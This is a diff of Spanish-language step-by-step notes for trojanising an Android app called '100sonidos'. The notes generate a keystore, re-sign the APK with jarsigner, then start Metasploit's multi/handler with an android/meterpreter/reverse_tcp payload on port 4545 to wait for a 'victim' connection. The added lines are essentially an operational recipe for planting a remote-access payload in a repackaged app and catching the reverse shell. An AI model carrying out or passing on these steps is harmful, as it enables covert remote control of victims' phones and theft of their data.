@@ -21,6 +21,20 @@ generar genkey
 keytool -genkey -v -keystore 100sonidos.keustore -alias 100sonidos -keyalg RSA -keysize 2048 -validity 10000
 pide password
 generamos certificado 
+pasamos el certificado a la palicacion original 
+jarsigner -verbose -sigalg SHA1withRSA -d igestalg SHA1 -keystore 100sonidos.keystore  100sonidos.apk 100sonidos<br>
+
+--iniciar consola em metaexploid comando msfconsole
+--esperamos conexion victima
+--usamos multi/handler 
+use multi/handler
+--usamos payload 
+set payload android/meterpreter/reverse_tcp
+configurar puerto usado set LPORT 4545
+SET LHOST "DIRECCION IP"
+
+--ESTA PREPARADO PARA LA CONEXION DE LA VICTIMA
+
 
 
  
